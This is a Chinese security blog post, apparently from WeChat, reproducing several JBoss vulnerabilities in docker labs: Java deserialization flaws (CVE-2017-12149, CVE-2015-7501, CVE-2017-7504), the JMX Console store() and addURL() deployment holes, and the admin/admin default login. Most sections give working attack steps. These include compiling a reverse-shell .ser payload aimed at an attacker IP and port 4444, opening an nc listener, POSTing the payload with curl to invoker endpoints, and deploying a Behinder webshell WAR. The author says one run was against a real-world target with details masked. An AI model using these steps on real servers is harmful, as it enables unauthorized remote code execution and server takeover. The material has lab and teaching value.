> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ryu4Q98syL75ninnpxtmaw)

简介
==

JBoss 是一个基于 J2EE 的开放源代码应用服务器，代码遵循 LGPL 许可，可以在任何商业应用中免费使用；JBoss 也是一个管理 EJB 的容器和服务器，支持 EJB 1.1、EJB 2.0 和 EJB3 规范。但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB 容器，一般与 Tomcat 或 Jetty 绑定使用。在 J2EE 应用服务器领域，JBoss 是发展最为迅速的应用服务器。由于 JBoss 遵循商业友好的 LGPL 授权分发，并且由开源社区开发，这使得 JBoss 广为流行。

CVE-2017-12149
==============

JBOSSApplication Server 反序列化命令执行漏洞 (CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。

漏洞原理
----

该漏洞为 Java 反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

首先需要了解 Java 的序列化和反序列化。Java 序列化就是指把 Java 对象转换为字节序列的过程，在传递和保存对象时. 保证对象的完整性和可传递性。对象转换为有序字节流, 以便在网络上传输或者保存在本地文件中。Java 反序列化就是指把字节序列恢复为 Java 对象的过程，根据字节流中保存的对象状态及描述信息，通过反序列化重建对象。

用代码看就是：

序列化：

```
FileOutputStream fos = new FileOutputStream(file); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(st);
```

反序列化:

```
FileInputStream fis = new FileInputStream(file); ObjectInputStream ois = new ObjectInputStream(fis); Student st1 = (Student) ois.readObject();
```

CVE-2017-12149 的漏洞出现在 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中，源码在 jboss\server\all\deploy\httpha-invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet 目录下的 ReadOnlyAccessFilter.class 文件中, 其中 doFilter 函数代码如下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoNMtKiciaoYrxtAW16lVYZIcnjfddeSpYbOqHRCzbRjf04Wf2w9L1IDfA/640?wx_fmt=png)

可以看出它从 http 中获取数据，通过调用 readobject() 方法对数据流进行反序列操作，但是没有进行检查或者过滤。这就造成了 JBoss 中 invoker/JMXInvokerServlet 路径对外开放，而且 JBoss 的 jmx 组件支持 Java 反序列化

漏洞复现
----

首先进入 CVE-2017-12149 的 docker 环境

```
cd jbosslscd CVE-2017-12149sudo docker-compose up -ddocker ps
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoAaQm8JygPwSGu3IHwWsqTMxlibKUdCmF1J1rLKYwOIwBM7AHpIZrziaA/640?wx_fmt=png)

访问`http://192.168.1.8:8080/invoker/readonly`，若返回如下界面则存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoYHGjGEZgJibLWvXqhDtPVvZLsKXlLia6kgibSUjlukPSKrARHsiaItaAPA/640?wx_fmt=png)

这里需要用到 javac 进行编译 ser 文件，所以首先安装 java 环境

```
cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gztar zxvf jdk-8u20-linux-x64.tar.gzrm -rf /usr/bin/java*ln -s /opt/jdk1.8.0_20/bin/j* /usr/binjavac -versionjava -version
```

可以看到这里 javac 环境已经存在

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUico4ctsLBqhJGE4uHx0u33c50JibiapqsJtJ8pCO5SQXMZqKdoZ0cE8e87g/640?wx_fmt=png)

利用反序列化工具 CVE-2015-7501：https://github.com/ianxtianxt/CVE-2015-7501/，这里使用的反序列化工具对于 CVE-2017-12149 和 CVE-2015-7501 两个漏洞都可以进行利用，总体上都是利用 java 的反序列化

这里我 git 这个工具一直 git 不下来，就找了个实战的环境打了码，原理跟 docker 复现是一样的

首先使用 java 编译 ser 文件

```
javac -cp .:commons-collections-3.2.1.jarReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口)
```

这个时候在这个目录下生成了一个 ReverseShellCommonsCollectionsHashMap.ser 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUico0WVcFEFMTmN6ujVo0PicTREUiahvcyxrqZliaRpoMnkbKozXh87JTh5sQ/640?wx_fmt=png)

这个时候我们还需要使用 nc 来监听一个端口来接受反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicot4pCEn5hXBrHP3EDX3AgxB2jnt3gWG1nSOicFH7hd8ibgIe4IS5xWTAw/640?wx_fmt=png)

再使用一个 curl 去请求反弹建立连接，就能够得到一个反弹 shell

```
curl http://目标机ip:port/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoQaxSLkwzqDmzSjSzNgAqOia1pfwsW80eRgTkg27jYXicC9qkvicvs77CQ/640?wx_fmt=png)

CVE-2015-7501
=============

JMXInvokerServlet 反序列化漏洞 (CVE-2015-7501)，JBoss 在`/invoker/JMXInvokerServlet`请求中读取了用户传入的对象，然后我们利用 Apache Commons Collections 中的 Gadget 执行任意代码。

漏洞原理
----

跟之前的 CVE-2017-12149 漏洞相似，都是使用了 java 的反序列化，该漏洞为 Java 反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，JBoss 在 / invoker/JMXInvokerServlet 请求中读取了用户传入的对象，从而导致了漏洞。

漏洞复现
----

进入 CVE-2015-7501 的 docker 环境，这里在 vlunhub 里面是直接用 JMXInvokerServlet 命名漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUico5C8Zm2G9ZGPmIdcMFfrGGv3IQ8sJTf4XLQVZlxyN9myPVWhVUMECJg/640?wx_fmt=png)

访问`http://192.168.1.8:8080/invoker/JMXInvokerServlet`弹出对话框则存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUico3ibhnqYptPIrm3OiaTjiaSC781odKcP34mRNud6PkaogsyJRelicPg6aWQ/640?wx_fmt=png)

使用 nc 监听 4444 端口，然后跟 CVE-2017-12149 一样使用 java 编译生成一个 ser 文件执行，使用 nc 监听端口即可得到反弹 shell

```
nc -lvp 4444curl http://192.168.112.148:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoQaxSLkwzqDmzSjSzNgAqOia1pfwsW80eRgTkg27jYXicC9qkvicvs77CQ/640?wx_fmt=png)

CVE-2017-7504
=============

CVE-2017-7504 为 JBossMQ JMS 反序列化漏洞

漏洞原理
----

CVE-2017-7504 漏洞与 CVE-2015-7501 的漏洞原理相似，只是利用的路径稍微出现了变化，CVE-2017-7504 出现在 / jbossmq-httpil/HTTPServerILServlet 路径下。JBoss AS 4.x 及之前版本中，JbossMQ 实现过程的 JMS over HTTP Invocation Layer 的 HTTPServerILServlet.java ⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码

漏洞复现
----

进入 CVE-2017-7504 的漏洞 docker 环境

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoPNM5aESiaFwibjVYHbliavqAJlMar7ZvNH9abduRtZDLvQZlHBPj9zwAQ/640?wx_fmt=png)

访问`http://192.168.1.10:8080/jbossmq-httpil/HTTPServerILServlet`，若出现如下界面则存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicomZg81P5sFfUXZFxOv89kerBsuSVK3YiaSkicIyfuK22g9f5tIFTvGRdw/640?wx_fmt=png)

使用 nc 打开端口监听，再用之前生成的. ser 文件，通过 POST 二进制数据上去，使用 nc 监听端口，即可拿到 shell

```
nc -lvp 4444curl http://192.168.112.148:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoQaxSLkwzqDmzSjSzNgAqOia1pfwsW80eRgTkg27jYXicC9qkvicvs77CQ/640?wx_fmt=png)

CVE-2007-1036
=============

CVE-2007-1036 即 JMX Console HtmlAdaptor Getshell，因为 JBoss 中 / jmx-console/HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到 jmx 控制台，并在其中执行任何功能

漏洞原理
----

该漏洞利用的是后台中 jboss.admin -> DeploymentFileRepository -> store() 方法，通过向四个参数传入信息，达到上传 shell 的目的，其中 arg0 传入的是部署的 war 包名字，arg1 传入的是上传的文件的文件名，arg2 传入的是上传文件的文件格式，arg3 传入的是上传文件中的内容。通过控制这四个参数即可上传 shell，控制整台服务器，arg1 和 arg2 可以进行文件的拼接，例如 arg1=she，arg2=ll.jsp。这个时候服务器还是会进行拼接，将 shell.jsp 传入到指定路径下

漏洞复现
----

这里使用之前的 docker 即可，首先访问下 8080 端口是一个 jboss

!

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoUarQ5Zecg0boWbdgqkuPdxM3XVXtXkZHWywl0wu2icmoZOA3FBydyGQ/640?wx_fmt=png)

访问`192.168.1.10:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin%3Aservice%3DDeploymentFileRepository`定位到 store() 方法

p1 为部署包的名字，p2 为脚本名字，p3 为脚本后缀，p4 为脚本内容即我们需要写入的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoRdvBMZ78NicDq66TbEzVGJOGFzb3RkO0e3ic499ffYJPiabnfNFdoznFA/640?wx_fmt=png)

点击 invoke 部署看到 successfully 说明上传成功，这时候再使用冰蝎连接即可

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUico1Uj8X4DqibB0K63bk1z2ibVibr1ElRaheOWiaPxFoHO1xmf4DOcy7vQyRw/640?wx_fmt=png)

JMX Console 未授权访问
=================

漏洞原理
----

默认情况下访问 http://ip:8080/jmx-console 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患

部署的 war 包在本地的路径为：

JBoss AS 6.x：`C:\jboss-6.1.0.Final\server\default\work\jboss.web\localhost`

JBoss AS 4.x：`C:\jboss-4.2.3.GA\server\default\work\jboss.web\localhost`

漏洞复现
----

使用之前的 docker 访问 8080 端口，点击 JMX Console 直接进入

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicopC7pJCU68GP6YyhCusoj704onhDAE40mPpjiaDNjofyEYsLwlk9iclfA/640?wx_fmt=png)

找到`flavor`字符串，这一行就是 jboss 远程部署 war 包所在的位置

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicowiajuhWUcPbicEK8n3Bsk3KjHbMwQTx3RmeezH0Vr43ZbkC329Sf1vfw/640?wx_fmt=png)

点进去之后找到 addURL() 这个位置

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoF1tlZnubgm46qZdESg9pBwBQyj07kh8v3tynjclvagJOZZiaxc8Zib8w/640?wx_fmt=png)

准备一个 jsp 小马，这里我用使用的是冰蝎，用 jar 打包当前文件夹下的文件

```
jar -cvf shell.war .
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoJvfrcg8yk3w7TI5sV3Ap9cJe4JkFPMBrcRrevm3hFy2UCtNdfcq3Dw/640?wx_fmt=png)

得到 shell.war

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoJO3ZsPdHeDG0icrvqZQgIm3hsvv3JopFkB3JQOTg606T2VZjUFZjSIA/640?wx_fmt=png)

使用 python 启动一个 http 服务

```
python -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoiaVc225SjmPb57DIVuY8lhHtFQicrHSmicmLR8haIw1GmdXrjjYnUKdmg/640?wx_fmt=png)

访问一下能够访问到

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoCTfvM43rSQjpToXn9dNuDYnOWYywP6ID1qBeNyH7WK7KUKgicn8FviaQ/640?wx_fmt=png)

再回到 addURL() 的地方，输入 war 文件的地址，然后点击 inmoke 部署

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoepPpQoS8ibdGAMdVCjxib9TLeo4bdrz4cDC60ibublGtQ6zessckJibtcw/640?wx_fmt=png)

可以看到已经部署成功了

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUico1mAbnPIEJFRf9PuZJwoVSIFfxylob5bXxtjk6zmLb3ouD5nIAZO7Nw/640?wx_fmt=png)

返回之后可以看到部署的物理位置

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoNcsoTIajn0a0rVvcJAic4MXnqq4Huhw8LwOZicrZcicJX7mlXJShYcYUA/640?wx_fmt=png)

点击应用更改

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoEIib4Jicld2e1f6Hy1ZArf0KkicNicOsqm7sz8zcJ0SRa94KbMiaeaLzqbQ/640?wx_fmt=png)

访问一下可以访问到，证明已经上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUico5MaMIL8WCXCf1E3pskaCmEPoUqd5IF17ibkN5viaOIuemNCDPqibBu0ZQ/640?wx_fmt=png)

这里使用冰蝎连接即可

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicog9BJmA1ISz0PUesoyV6VxpgN33Gmv7IRz9elc4oVia4a1tWT7gwDTibw/640?wx_fmt=png)

弱口令 getshell
============

在 jboss 的 6.x 版本里面存在一个弱口令 admin/admin，使用弱口令登陆后台并上传 war 包

漏洞原理
----

JBoss Administration Console 存在默认账号密码 admin/admin，如果 Administration Console 可以登录，就可以在后台部署 war 包 getshell

漏洞复现
----

访问 8080 端口点击`Administration Console`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoQnURxqjTT8Yic7xpn9yNujNOyBia2CKVL4bebmac8qrbOe3dColjiabdw/640?wx_fmt=png)

使用 admin/admin 进入后台

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoI3NgOAo9amRMYNUR9FqqnibE7aBteDan8vt3M7iba8v70DRCEkFYEv8g/640?wx_fmt=png)

选择 war 包进行上传

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUicoylUP4vpQlTWeS47ichZ4Nk4icThRiaV1SiaLpkRqn2Lic0Fdg5FVYhZlpXg/640?wx_fmt=png)

上传成功，使用冰蝎连接即可

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouicc1je6ojXBfxjfvadSPUico2NQiaJJXhBLylJXXy2M2nryseHl72ODWaWu5LNKEgWunEGqxfzEjiaug/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)**

**推荐阅读：**

**[干货 | Spring 系列 CVE 以及 POC 编写](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498027&idx=1&sn=6800b032fb7d44edf98b8a95187a3d73&chksm=ec1cac14db6b25022aecbca4b54b9e76f8c5de9a448d0fcc4f36b7ef45daaa25b32829c24b6b&scene=21#wechat_redirect)  
**

**[干货｜Java Spring 安全学习笔记](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499429&idx=1&sn=a96a0e81109294703d6a5192fce7ca2a&chksm=ec1cab9adb6b228cac06a76d3db1928b1bde0b4338065c5e9d62f3dded94cc54a4f04cf123d2&scene=21#wechat_redirect)**  

[**干货 | 最全的 Weblogic 漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498979&idx=1&sn=254f5fd3cde4cf3a4bcdcce58c1029f1&chksm=ec1ca9dcdb6b20ca20ea2838ddaf3ba17fdf239fb057db49ac866bf4d94f70518915801fcc6d&scene=21#wechat_redirect)  

[**干货｜最全的 Tomcat 漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499491&idx=1&sn=d733ae33b91bca49e6b2346502823940&chksm=ec1cabdcdb6b22ca62fbd204d2da5f7fbce8874cf4072e1cd55cbc92e8a829aea55994a8fc52&scene=21#wechat_redirect)  

**点赞，转发，在看**

原创投稿作者：mathwizard

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)